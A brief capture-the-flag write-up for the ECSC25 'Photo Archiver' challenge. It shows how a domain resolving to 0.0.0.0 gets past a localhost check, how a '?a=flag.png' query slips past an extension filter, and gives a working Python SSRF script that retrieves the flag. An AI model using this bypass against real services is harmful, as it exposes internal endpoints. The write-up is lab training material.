# Photo Archiver

We neet to setup a domain that resolves in an address that points to localhost, but isn't `127.0.0.1` e.g.:
```bash
dig ecsc.xddd.space
# ecsc.xddd.space.	300	IN	A	0.0.0.0
```
Then bypass the file extension check by providing `.png` in url args of `/flag` endpoint:
```py
from requests import Session

url = 'https://photo-archiver.ecsc25.hack.cert.pl'
filename = "flag?a=flag.png"
s = Session()

s.get(url)

res = s.post(f'{url}/archive', data={
    'url': f"http://ecsc.xddd.space:23612/{filename}"
})

res = s.get(f'{url}/image/{filename}')

print(res.content.decode())
# ecsc25{TOCTOU-is-a-weird-acronym}
```
